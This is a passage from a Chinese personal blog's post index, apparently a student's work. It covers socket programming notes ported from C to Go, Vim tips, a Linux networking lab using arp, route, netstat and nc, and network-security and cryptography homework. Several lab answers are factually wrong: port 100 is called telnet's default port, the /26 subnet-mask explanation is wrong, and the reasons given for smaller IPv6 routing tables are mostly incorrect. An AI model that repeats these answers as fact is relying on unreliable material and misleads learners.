log.Fatalf(\u0026#34;Failed to read from server: %v\u0026#34;, err) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) } 运行 编译运行服务器 1 2 go build -o ch1/hello_server ch1/hello_server.go ./ch1/hello_server 8080 编译运行客户端 1 2 3 4 5 go build -o ch1/hello_client ch1/hello_client/hello_client.go ./ch1/hello_client 127.0.0.1 8080 Message from server: Hello world! 1.2 文件操作 打开文件 首先介绍打开文件以读写数据的函数。 调用此函数时需传递两个参数:第一个参数是打开的目标文件名及路径信息,第二个参数是文件打开模式(文件特性信息)。\n1 2 3 4 5 6 7 #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int open(const char * path ，int flag) //成功时返回文件描述符事失败时返回1 //path 文件名字符串地址 //flag 文件打开模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func Open(name string) (*File, error) { return OpenFile(name, O_RDONLY, 0) } // OpenFile 是一个通用的文件打开函数，它接受三个参数：文件名、打开文件的标志和文件权限。 // 它返回一个 *os.File 对象和一个 error 对象。如果打开文件失败，它会返回一个非 nil 的 error 对象。 func OpenFile(name string, flag int, perm FileMode) (*File, error) { // 记录打开文件的操作 testlog.Open(name) // 使用 openFileNolog 函数打开文件，这个函数不记录日志 f, err := openFileNolog(name, flag, perm) // 如果打开文件失败，返回错误 if err != nil { return nil, err } // 检查打开文件的标志是否包含 O_APPEND，如果包含，设置 f.appendMode 为 true f.appendMode = flag\u0026amp;O_APPEND != 0 // 返回打开的文件 return f, nil } 关闭文件 1 2 3 4 #include \u0026lt;unistd.h\u0026gt; int close(int fd); //成功时返回Q,失败时返回-1。 //fd:需要关闭的文件或套接字的文件描述符 1 2 3 4 5 6 7 8 9 10 // Close closes the File, rendering it unusable for I/O. // On files that support SetDeadline, any pending I/O operations will // be canceled and return immediately with an ErrClosed error. // Close will return an error if it has already been called. func (f *File) Close() error { if f == nil { return ErrInvalid } return f.file.close() } 将数据写入文件 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t write(int fd, const void * buf, size_t nbytes); //成功时返回写入的字节数,失败时返回-1。 //fd:数据传输对象的文件描述符 //buf 保存数据的缓冲地址 //nbytes：要传输的字节数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // write writes len(b) bytes to the File. // It returns the number of bytes written and an error, if any. // write 是 File 结构体的一个方法，它接受一个字节切片 b 作为参数， // 尝试将这个字节切片写入到文件中。 func (f *File) write(b []byte) (n int, err error) { // f.pfd.Write(b) 调用 pfd（代表平台依赖的文件描述符）的 Write 方法， // 尝试将 b 写入到文件。这个方法返回写入的字节数和一个错误（如果有的话）。 n, err = f.pfd.Write(b) // runtime.KeepAlive(f) 是一个用于防止 f 被垃圾回收的调用。 // 在某些情况下，如果 f 在 f.pfd.Write(b) 调用之后没有被再次使用， // Go 的垃圾回收器可能会在 Write 调用还在进行时就回收 f。 // runtime.KeepAlive(f) 确保 f 在 Write 调用完成之前不会被垃圾回收。 runtime.KeepAlive(f) // 返回写入的字节数和错误（如果有的话） return n, err } 代码示例改写 low_open.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { buf := []byte(\u0026#34;Let\u0026#39;s go!\\n\u0026#34;) //打开文件，如果不存在则创建，如果存在则清空，权限为 0644 f, err := os.OpenFile(\u0026#34;data.txt\u0026#34;, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //输出文件描述符 log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //写入文件 _, err = f.Write(buf) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } } 运行代码\n1 2 3 go build -o ch1/low_open ch1/lowOpen/low_open.go ./ch1/low_open file descriptor: 3 读取数据 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t read(int fdJ void * buf, size_t nbytes); //\u0026#39;成功时返回接收的字节数(但遇到文件结尾则返回θ),失败时返回10 //fd 显示数据接收对象的文件描述符。 //buf 要保存接收数据的缓冲地址值。 //nbytes 要接收数据的最大字节数。 示例代码改写 low_read.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { //只读打开文件 f, err := os.Open(\u0026#34;data.txt\u0026#34;) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //输出文件描述符 log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //读取文件 buf := make([]byte, 1024) n, err := f.Read(buf) if err != nil { log.Fatalf(\u0026#34;read() error: %v\u0026#34;, err) } log.Printf(\u0026#34;file data: %s\u0026#34;, buf[:n]) } 运行代码\n1 2 3 4 5 go build -o ch1/low_read ch1/lowRead/low_read.go ./ch1/low_read 2023/11/10 16:45:54 file descriptor: 3 2023/11/10 16:45:54 file data: Let\u0026#39;s go! 文件描述符与套接字 原文c代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; int main() { int fd1, fd2, fd3; //创建一个文件和两个套接字 fd1 = socket(PF_INET, SOCK_STREAM, 0); fd2 = open(\u0026#34;test.dat\u0026#34;, O_CREAT | O_WRONLY | O_TRUNC); fd3 = socket(PF_INET, SOCK_DGRAM, 0); //输出之前创建的文件描述符的整数值 printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1); printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2); printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3); close(fd1); close(fd2); close(fd3); return 0; } 改写后 fd_seri.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { // 使用 syscall.Socket 函数创建一个 TCP 套接字，返回的是文件描述符 fd1 fd1, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // 使用 os.OpenFile 函数创建一个文件 \u0026#34;test.dat\u0026#34;，返回的是 *os.File 类型的 fd2 fd2, _ := os.OpenFile(\u0026#34;test.dat\u0026#34;, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644) // 使用 syscall.Socket 函数创建一个 UDP 套接字，返回的是文件描述符 fd3 fd3, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0) // 使用 fmt.Printf 函数打印出三个文件描述符的值 // 注意，对于 *os.File 类型的 fd2，我们使用了 Fd 方法来获取其底层的文件描述符 fmt.Printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1) fmt.Printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2.Fd()) fmt.Printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3) // 使用 Close 方法和 syscall.Close 函数关闭了这三个文件描述符，以释放系统资源 fd2.Close() syscall.Close(fd1) syscall.Close(fd3) } 运行\n1 2 3 4 5 go build -o ch1/fd_seri ch1/fdSeri/fd_seri.go ./ch1/fd_seri file descriptor 1: 3 file descriptor 2: 4 file descriptor 3: 5 1.3 基于Windows平台的实现 略\n1.4 基于Windows的套接字相关函数及示例 1.5 习题 套接字在网络编程中的作用是什么?为何称它为套接字? 套接字（socket）是网络编程中的抽象概念，它提供了一种机制，使得不同计算机之间可以进行通信和数据交换。套接字可以看作是网络通信的端点，它包含了通信所需的各种信息，如IP地址、端口号、协议等。套接字的名称来源于插座（socket），类比插座连接电器，套接字连接网络。通过套接字，计算机可以在网络上进行数据的发送和接收，实现网络通信的功能。\n在服务器端创建套接字后,会依次调用listen函数和accept 函数。请比较并说明二者作用。 listen函数用于将套接字标记为被动套接字，即用于接受客户端的连接请求。它告诉操作系统该套接字将用于接受传入的连接，而不是发起连接。在调用listen函数后，套接字将进入监听状态，等待客户端的连接请求。 accept函数用于从处于监听状态的套接字中接受一个连接。当客户端尝试连接到服务器时，服务器调用accept函数来接受这个连接，并创建一个新的套接字来与客户端进行通信。这个新的套接字可以用于与该客户端进行数据交换，而原始的监听套接字则继续等待其他客户端的连接请求。accept函数的返回值是一个新的套接字，通过它可以进行与客户端的通信。\nLinux中,对套接字数据进行I/O时可以直接使用文件I/O 相关函数;而在Windows中则不可以。原因为何? 这是因为在Linux中，套接字被视为一种文件描述符，因此可以使用文件I/O相关函数（如read和write）来进行I/O操作。而在Windows中，套接字和文件描述符是不同的概念，Windows采用了不同的I/O模型，因此不能直接使用文件I/O相关函数来对套接字数据进行I/O操作。在Windows中，需要使用特定的套接字I/O函数（如recv和send）来进行套接字数据的读写操作。\n创建套接字后一般会给它分配地址,为什么?为了完成地址分配需要调用哪个函数 创建套接字后需要给它分配地址，这是为了让其他主机能够找到并与该套接字进行通信。在网络编程中，这个地址通常是IP地址和端口号的组合。 为了完成地址分配，需要调用bind函数。bind函数将一个本地地址（IP地址和端口号）分配给套接字，使得其他主机可以通过这个地址与该套接字进行通信。\nLinux中的文件描述符与Windows的句柄实际上非常类似。请以套接字为对象说明它们的含义。 文件描述符和Windows的句柄在套接字的上下文中具有类似的含义。它们都是用来标识和引用套接字的抽象概念。 在Linux中，套接字也被视为一种文件描述符，因此可以使用类似于文件I/O的操作来进行套接字的读写等操作。 在Windows中，套接字使用句柄来进行引用和操作，句柄是一种抽象的引用类型，可以用来标识和操作套接字。 因此，无论是文件描述符还是句柄，它们都是用来引用和操作套接字这种抽象对象的标识符。\n底层文件I/O函数与ANSI 标准定义的文件I/O函数之间有何区别? 底层文件I/O函数是直接调用操作系统提供的文件操作接口，如open、read、write等，它们提供了对文件的低级别访问，可以更加灵活地控制文件的读写操作。 而ANSI标准定义的文件I/O函数则是标准C库中提供的一组文件操作函数，如fopen、fread、fwrite等，它们提供了更加抽象和便捷的文件操作接口，使得跨平台开发更加方便，并且提供了一些缓冲和错误处理的功能。 因此，底层文件I/O函数更加接近操作系统提供的文件操作接口，而ANSI标准定义的文件I/O函数则提供了更加便捷和跨平台的文件操作接口。\n参考本书给出的示例low_open.c 和low_read.c ,分别利用底层文件I/O 和ANSI标准I/O 编写文件复制程序。可任意指定复制程序的使用方法。\n","date":"2023-11-11T12:47:47+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第一章笔记"},{"content":"尝试学习一下vim\nvim模式切换 normal转insert i 光标前插入 I行首插入 o进入下一行输入 O上一行插入 a光标之后输入 A行末尾插入\ninsert 转normal esc/jj 变回普通模式\nnormal转visual v变成可视模式（无法编辑）\nvisual转nomal esc或者v变回普通模式\n普通模式转命令模式 ：转成命令模式\n命令模式转普通模式 esc\n光标移动 普通模式下光标移动 动作 motion 操作符 删除全部 die 复制全部 yie u 撤销\n大小写 常用 gd 查看函数定义 ^O返回 g数字 切换标签/ctrl+数字 command+0 到文件夹 o打开 回车修改名字\neasymotion 空格空格s + 要查询的字幕 空格空格+e 空格空格+w\nvim surround 光标转移到终端 leader + t\n切换tab gt或gT\n","date":"2023-11-10T12:43:42+08:00","permalink":"https://anonymity-0.github.io/posts/vim/","title":"Vim"},{"content":"实验内容 arp 在 HostA 和 HostB 中分别打开一个终端用于本实验。\n在 HostA 和 HostB 中分别执行命令ifconfig ens5，查看并记录它们各自的IPv4 地址。执行命令 ifconfig ens6 查看 IPv6 地址 (global 和 link 两种) 以及以太网接口的物理地址。 截图： 命令解释： ifconfig 是一个用于配置和显示网络接口信息的命令。ens5 和 ens6 是网络接口的名称，通常用于表示以太网接口。ifconfig ens5 命令用于显示名为 ens5 的网络接口的配置信息，包括 IP 地址、子网掩码、广播地址、MAC 地址等。\n在 HostA 中执行命令 arp -n 或ip neigh show 查看并记录本机 ARP 缓存表的内容。\n命令解释： arp -n 是一个用于查看本地ARP缓存表的命令。它会显示已解析的IP地址和对应的MAC地址。 ip neigh show 是一个用于查看本地邻居表的命令。它会显示已解析的IP地址和对应的MAC地址，类似于 arp -n 命令。 arp -n 和 ip neigh show 都是用于查看本地ARP缓存表或邻居表的命令，它们的功能相似但有一些区别。\n命令格式不同：arp -n 是在大多数操作系统中使用的命令，而 ip neigh show 是在基于 Linux 的操作系统中使用的命令。 输出格式不同：arp -n 输出的结果通常是以表格形式显示的，包括IP地址和对应的MAC地址。而 ip neigh show 输出的结果可能更详细，包括IP地址、MAC地址、接口、状态等信息。 支持的功能不同：ip neigh show 命令在功能上更加强大，可以显示更多关于邻居的信息，如状态、接口类型等。而 arp -n 命令通常只显示基本的IP地址和MAC地址信息。 截图： 在 HostA 中执行命令 ping -c 1 HostB 的 IPv4 地址向 HostB 发送 ICMP 请求报文。收到 ICMP 响应后再次执行命令 arp -n 或ip neigh show 查看 HostA的 ARP 缓存表的内容。\n命令解释 ping -c 1 HostB 是一个用于向 HostB 发送一个 ICMP 回显请求（ping）的命令。其中，-c 1 表示只发送一次请求。\n截图 在 HostA 的 ARP 缓存表里面可获得 HostB 的 MAC 地址，记录下来，检查与 HostB 上ifconfig ens5 命令的执行结果是否一致。 与 HostB 上ifconfig ens5 命令的执行结果一致\n在 HostA 中执行命令ping -c 1 202.38.64.246，收到 ICMP 响应后继续执行命令ip neigh show 查看 HostA 的 ARP 缓存表，记录结果。简要解释为何无法看到对应于地址 202.38.64.246 的 ARP 表项而只能得到网关的某网卡的MAC 地址。提示：思考网段(链路)、广播域的概念。\n截图： 解释： 这是因为，ARP 协议用于在同一网段内查找主机的 MAC 地址。当 HostA 发送 ICMP 请求到目标地址 202.38.64.246 时，目标地址不在 HostA 的网段内，因此 HostA 需要向网关发送广播 ARP 请求。网关收到广播 ARP 请求后，会将自己的 MAC 地址回复给 HostA。HostA 收到网关的回复后，将网关的 MAC 地址存储在 ARP 缓存表中。因此，HostA 无法看到对应于地址 202.38.64.246 的 ARP 表项。\nIP 分别用命令 route -n 和命令route \u0026ndash;inet6 查看本机的 IPv4 和 IPv6 路由配置，记录所在子网的子网掩码/前缀长度，并于前面 ifconfig 的结果作比较。\n命令解释 route -n 是一个用于显示 IPv4 路由表的命令。它会列出系统中当前配置的所有 IPv4 路由项，包括目的网络、网关、子网掩码、接口和路由标志等信息。该命令中的 -n 选项表示以数字形式显示 IP 地址和子网掩码，而不进行主机名和网络地址的解析。 route --inet6 是一个用于显示 IPv6 路由表的命令。它会列出系统中当前配置的所有 IPv6 路由项，包括目的网络、网关、前缀长度、接口和路由标志等信息。该命令中的 --inet6 选项表示只显示 IPv6 路由表的信息。 截图： ![[Pasted image 20231106202048.png]] 比较两者的结果，可以看到，IPv4 和 IPv6 路由表中的子网掩码/前缀长度均与ifconfig的结果一致。\n执行以下两个命令分别查看系统内核的 IPv4 和 IPv6 的 FORWARD 值，记录下来。简单解释这个值的含义以及为何这个值是这样设定的。提示：思考主机与路由器的区别。\n命令 1：cat /proc/sys/net/ipv4/ip_forward 命令 2：cat /proc/sys/net/ipv6/conf/all/forwarding\n命令解释： 命令1：cat /proc/sys/net/ipv4/ip_forward 用于查看 IPv4 转发功能的状态。在 Linux 系统中，如果该值为 1，则表示启用了 IPv4 转发功能，即允许将数据包从一个网络接口转发到另一个网络接口。 命令2：cat /proc/sys/net/ipv6/conf/all/forwarding 用于查看 IPv6 转发功能的状态。类似于 IPv4，如果该值为 1，则表示启用了 IPv6 转发功能，允许将数据包从一个 IPv6 网络接口转发到另一个 IPv6 网络接口。\n截图： 解释： 可以看到，系统内核的 IPv4 和 IPv6 的 FORWARD 值均为 0。FORWARD 值的含义是是否允许系统转发 IP 数据包。如果 FORWARD 值为 0，则系统不允许转发 IP 数据包。主机和路由器的区别在于，主机只能与同一子网内的主机通信，而路由器可以连接多个子网，并负责将数据包从一个子网转发到另一个子网。由于主机只能与同一子网内的主机通信，因此不需要转发 IP 数据包。因此，主机的 FORWARD 值通常为 0。\nTCP 在 S 的终端 1 中执行 nc -l 1958 侦听1958 端口。。 命令解释： 命令 nc -l 1958 将在 TCP 端口 1958 上监听传入连接\nnc：netcat 命令 -l：监听传入连接 1958：端口号 截图： 在HostA 的终端 1 执行nc S 的IPv4 地址 1958\n截图： 在HostA 终端 2 中执行命令netstat -aunt 来观察自己主机上的所有 TCP 与UDP 连接状况，将输出的信息记录下来。请在上述记录的结果中找到对应于上述连接的那条记录并解释这条记录的含义。\n命令解释： 执行 netstat -aunt 命令可以查看当前系统上所有的网络连接和监听端口，以及它们的状态、协议类型、本地地址和远程地址等信息 截图： 这条记录表示，HostA 主机的60260端口与 S 主机的 1958 端口建立了 TCP 连接。\n执行命令 nc S 的 IPv4 地址 100，记录命令执行结果。同样使用 netstat -aunt 来查看本机的连接状况，请判断这次 telnet 连接是否成功建立并简单说明原因。 原因是 100 端口是 telnet 服务器的默认端口，但 S 主机没有在 100 端口上监听 telnet 连接。因此，HostA 主机无法与 S 主机建立 telnet 连接。\n思考题 现在有一个网段的 IP 地址和子网掩码分别为202.38.75.0/255.255.255.192，请计算该网段中一共有多少个全局 IPv4 地址可供主机使用，或者说这个网络中有多少真正可分配的 IP 地址？\n子网掩码 255.255.255.192 的二进制表示为 11111111 11111111 11111111 11000000，其中前 24 位为 1，表示该网段的网络地址部分，后 8 位为 0，表示该网段的广播地址部分。因此，该网段中一共有 2^6 - 2 = 62 个全局 IPv4 地址可供主机使用。\n实验中执行 ifconfig ens3 查看接口的配置信息时可以观察到一个重要的参数MTU，请问这个值是多少？查询资料说明 MTU 参数的用途。\nMTU 是最大传输单元（Maximum Transmission Unit）的缩写，指的是网络层协议所能通过的最大数据包大小。MTU 的值通常与通信接口有关（网络接口卡、串口等）。 MTU 的值通常以字节为单位，常见的默认值是 1500 字节。这是因为以太网是最常见的网络类型，而以太网的标准帧大小为 1518 字节（包括帧头和帧尾），减去以太网帧头的 18 字节，剩下的 1500 字节就是可用于数据传输的最大数据量。 当数据包的大小超过 MTU 值时，网络层协议会将数据包分片，将数据包拆分成多个小数据包，然后分别传输。分片会增加网络层协议的复杂度，并降低网络效率。因此，在实际应用中，需要根据网络环境调整 MTU 参数的值，以保证数据包能够正常传输，并提高网络效率。\n9. IPv6 地址长度是 IPv4 地址长度的 4 倍，不过在今后的纯 IPv6 网络环境中路由器的 路由表的规模反而有望减小，请简单解释这是为什么？\n在纯 IPv6 网络环境中，路由器的路由表规模有望减小的原因： 1. IPv6 支持路由重叠，即多个路由器可以指向同一个目标地址。这意味着 IPv6 路由器可以共享路由信息，从而减少路由条目的数量。 2. IPv6 路由表结构更加简化。IPv6 路由表采用了扁平化的结构，每个路由表项只需要存储一个目标地址和下一跳地址即可。而 IPv4 路由表采用了分层的结构，每个路由表项还需要存储一个前缀长度和子网掩码。 3. IPv6没有私有地址和NAT技术,减少了路由表中的条目。 4. IPv6 支持动态路由，即路由器可以自动学习到目标地址的路由信息。这意味着 IPv6 路由器不需要手动配置路由条目，从而减少路由条目的数量。 一条 TCP 连接需要哪几个参数标识？\n一条 TCP 连接需要四个参数来标识，即：\n本地 IP 地址：表示连接的本地主机的 IP 地址。 本地端口号：表示连接的本地主机的端口号。 远程 IP 地址：表示连接的远程主机的 IP 地址。 远程端口号：表示连接的远程主机的端口号。 ","date":"2023-11-07T12:46:21+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/","title":"信网实验1"},{"content":"得分：10/10\n路由配置 配置路由器Router 安装远程访问“角色和功能” 设置IP地址和默认网关的IP地址。 启用“路由和远程访问服务” 关闭防火墙 ![[Pasted image 20231024224258.png|300]]\n配置VPN Server 路由远程访问服务器设置 ![[Pasted image 20231023164229.png|400]]\n新建用户 ![[Pasted image 20231024224417.png|400]]\nVPN server的ip地址配置 ![[Pasted image 20231024223002.png|400]]\n配置客户端 client B的ip地址 将ip地址设置为192.168.86.24 24为学号末2位 client A的ip地址 将ip地址设置为55.0.0.24 ![[Pasted image 20231024211518.png|400]]\nVPN连接 进行VPN连接 ![[Pasted image 20231024223124.png|400]]\n连接后的IP变化 clientA ![[Pasted image 20231024221917.png|400]]\nVPN Server ![[Pasted image 20231024223749.png|400]]\nwireshark抓包 ","date":"2023-10-26T15:51:26+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/","title":"网络安全作业2"},{"content":"得分：10/10\n简述防火墙的定义 防火墙是位于两个(或多个)网络之间执行访问控制的软件和硬件系统，它根据访问控制规则对进出网络的数据流进行过滤。\n防火墙对数据流的拒绝和丢弃有何区别?\n当数据流被拒绝时，防火墙要向发送者回复一条消息，用ICMP包告知数据源数据包被拒绝的原因，提示发送者该数据流已被拒绝。 当数据流被丢弃时，防火墙不会对这些数据包进行任何处理，也不会向发送者发送任何提示信息。丢弃数据包的做法加长了网络扫描所花费的时间，发送者只能等待回应直至通信超时。 简述数据包过滤器和状态防火墙。\n数据包过滤器通过数据包的头部信息来判断是接受还是拒绝数据包，它并不查看数据包载荷中的应用数据。这种防火墙检查流经它的每个数据包，根据数据包本身所带的信息决定它的去留，而不用参考其他数据包的内容。 状态防火墙会通过对流经的数据包的分析查找通信中的数据流，根据数据流的信息来帮助判断是否让数据包通行。数据流提供了数据包的上下文。状态防火墙有时还会检测一些常用协议的应用数据（虽然可以检测的数据量是有限的），通过这些数据来识别和跟踪相关的数据流。 与包过滤防火墙相比，应用代理防火墙有哪些特点？\n在已有的安全模型中安全性较高。 具有强大的认证功能。 具有超强的日志功能。 应用级网关防火墙的规则配置比较简单 在防火墙的典型部署中，堡垒主机是一个组织机构网络安全的中心主机，它应该具备哪些主要特征？\n堡垒主机硬件平台运行较为安全的操作系统，成为可信任的系统。 只有网络管理员认为必要的服务(代理和用户认证等)才会安装在堡垒主机上。 当允许一个用户访问代理服务时，堡垒主机可能会要求进行额外认证。另外，每一个代理服务都可能需要相应的鉴别机制(Authentication) 每一个代理都只能支持标准应用服务命令集中的一个子集。 每一个代理只允许访问指定主机的通信，支持对通信进行详细的审计。 每一个代理模块都是一个为网络安全设计的一个很小的软件包。 代理之间相互独立。 代理通常无需进行磁盘访问，不需要读取初始配置文件。这使得入侵者很难在主机上安装Trojan horse、sniffers或其他危险的文件。 堡垒主机是一个组织机构网络安全的中心主机。 ","date":"2023-10-26T10:17:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/","title":"网络安全作业3"},{"content":"得分：9/10\n第一章 1. 如果你的网络服务器被黑客远程控制，列举3个可能被破坏的安全属性， 并解释理由。 机密性： 理由：远程控制服务器后，黑客可以在未被授权的情况下获取个人信息、数据库记录等数据，导致数据泄露和隐私侵犯。 完整性： 理由：黑客远程服务器后，可以篡改服务器上的数据或者程序文件，修改网站内容、更改配置文件、插入恶意代码等。 可用性： 理由：黑客可能通过远程控制服务器发动拒绝服务攻击或直接禁用服务器上的关键服务和功能，导致服务器无法正常运行。 不可抵赖性： 理由：黑客可以使用服务器的访问权限执行恶意操作如数据篡改。如果服务器没有足够的安全措施来记录这些操作并确保其不可抵赖性，那么黑客可能会否认曾经执行过这些操作，导致难以追踪和证明责任。\n2. 简述RFC2828安全服务的定义，例举Windows10系统的3种安全服务。\nRFC2828定义了安全服务为一种由系统提供的对系统资源进行特殊保护的处理或通信服务，安全服务通过安全机制来实现安全策略。ITU-T（即X.800）定义了五种服务：身份认证、访问控制、数据保密、数据完整性、不可否认。 Windows 10操作系统中的三种安全服务：\n认证服务：认证服务用于验证用户的身份，确保只有经过授权的用户能够访问系统或资源。在Windows 10中，用户必须提供正确的用户名和密码才能登录到系统。 访问控制服务：访问控制服务用于确定哪些用户或实体具有权限访问特定资源或执行特定操作，并确保未经授权的访问被拒绝。在Windows 10中，访问控制服务管理文件和文件夹的权限，以及系统资源的访问权限。 加密服务：加密服务用于将敏感数据转化为不可读的格式，以确保即使数据被未经授权的访问者获取，也无法理解其内容。只有具有正确密钥的用户才能解密数据。BitLocker是一个Windows 10中的工具，它可以加密整个硬盘或者某些部分，以保护数据免受丢失或盗取的威胁。 3 . 简述网络安全防护主要目标的“五不”。 1. 不泄露（Non-Disclosure）：确保网络中的敏感信息和数据不会泄露给未经授权的用户或系统。 2. 不破坏（Non-Destruction）：防止网络系统和数据被破坏、损坏或篡改。 3. 不拒绝（Non-Repudiation）：确保在网络交互中的各种操作和交易都可以被证明，不容易被否认。 4. 不中断（Non-Interruption）：确保网络服务的持续可用性，防止由于攻击、故障或其他原因导致的网络服务中断。 5. 不迟滞（Non-Delay）：保障网络通信的实时性，防止因网络拥塞、延迟或其他问题导致通信延迟。\n第三章 1. 在腾讯会议系统中，对称密码技术和公钥密码技术适合应用在哪几个阶段?说明理由。\n会话加密阶段：对称密码技术非常适合在会话加密阶段使用。一旦参与会议的用户建立了安全连接，可以使用对称加密算法来加密和解密数据通信。这是因为对称密码技术具有较高的加密和解密速度，使其非常适合对大量的音视频数据进行快速的加密和解密操作。\n登录时身份验证和密钥交换阶段：公钥密码技术通常用于安全地进行身份验证和密钥交换。在腾讯会议系统中，当用户首次登录时，可以使用公钥密码技术来验证其身份，并协商用于对称加密的会话密钥。\n2. 简述散列函数MD5的碰撞问题。既然MD5存在碰撞问题，为何http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/ 仍然给出MD5值作为完整性验证的依据。 MD5的碰撞问题是指两个不同的输入数据在经过MD5算法处理后，得到了相同的散列值。这种情况被称为碰撞。 至于为什么仍然给出MD5值作为完整性验证的依据，可能是因为MD5是一个相对快速的散列函数，适用于快速验证大量文件的完整性。发行盘之后的系统安装和软件安装也有额外的安全验证程序。\n3. 简述用RSA公钥算法实现数字签名的过程。（这个问题回答的不好） 数字签名过程如下： 1. 发送者使用自己的私钥对消息进行加密，生成数字签名。 2. 发送者将消息和数字签名一起发送给接收者。 3. 接收者使用发送者的公钥对数字签名进行解密，得到消息的摘要。 4. 接收者使用相同的摘要算法对消息进行摘要处理，得到摘要。 5. 接收者比较两个摘要是否相同，如果相同，则说明消息没有被篡改过。\n4. 用PGP加密某个文件，如果接收该加密文件的用户为1个，加密文件的大小为24kB；如果接收该加密文件的用户 为10个，请问加密文件的大小是原来的10倍(240kB)吗？为什么？ 答：加密文件的大小不会是原来的10倍，由于对称密钥是相对较短的，每个接收者的非对称密钥通常很小。因此，无论接收者数量是1个还是10个，对称密钥密文的总大小都不会显著增加，而文件内容加密只需一次，因此文件大小仍然是原始文件大小（24kB）加上对称密钥密文的大小的总和，而不会变成原来的10倍。\n","date":"2023-10-26T10:17:13+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/","title":"网络安全作业1"},{"content":"网络安全实验配置 由于Mac的m系列芯片使用了arm架构与windows server镜像要求的x86架构不同，老师使用的virtual box和mac最常用的pd模拟器均只能进行同架构系统的模拟。于是乎我又查阅了资料，发现UTM可以在mac上进行不同架构的模拟（虽然很卡也很难用，终归是跑通了），以下是我的配置过程:\nUTM下载和安装 直接官网UTM | Virtual machines for Mac下载并安装就好。\nwindows server镜像下载 这时候又出岔子了，老师提供的windows 2003不知道是不是太老了，UTM模拟不了。只能想办法换更新的windows sever2012 下载镜像地址：HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站 注：需下载迅雷进行磁力链下载\nwireshark的安装 直接官网Wireshark · Go Deep下载安装就好\nUTM和本地文件的共享 待补充\n终于是能在mac上跑实验了，类目。\nUTM下复制的主机互ping问题 本来像按照老师所给的内容配置了七个host-only网络，网络是可以搭建起来的，但是server和client两个虚拟机之间无法互ping。 查阅了很多资料之后发现得设置成桥接模式，并把接口设置成en0即可。如图： ","date":"2023-10-26T10:15:50+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/","title":"网络安全实验配置"},{"content":"参考：快速入门 | Hugo 中文网\n环境准备 安装hugo brew install hugo\n问题1\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Recv failure: Operation timed out 解决方法：关闭代理\n问题2\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Failed to connect to github.com port 443 after 75008 ms: Couldn\u0026#39;t connect to server 配置代理\n1 2 3 4 5 git config --global http.proxy 127.0.0.1:7890 git config --global https.proxy 127.0.0.1:7890 git config --global http.proxy socks5 127.0.0.1:7890 git config --global https.proxy socks5 127.0.0.1:7890 问题3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Error: Your Command Line Tools (CLT) does not support macOS 14. It is either outdated or was modified. Please update your Command Line Tools (CLT) or delete it if no updates are available. Update them from Software Update in System Settings. If that doesn\u0026#39;t show you any updates, run: sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install Alternatively, manually download them from: 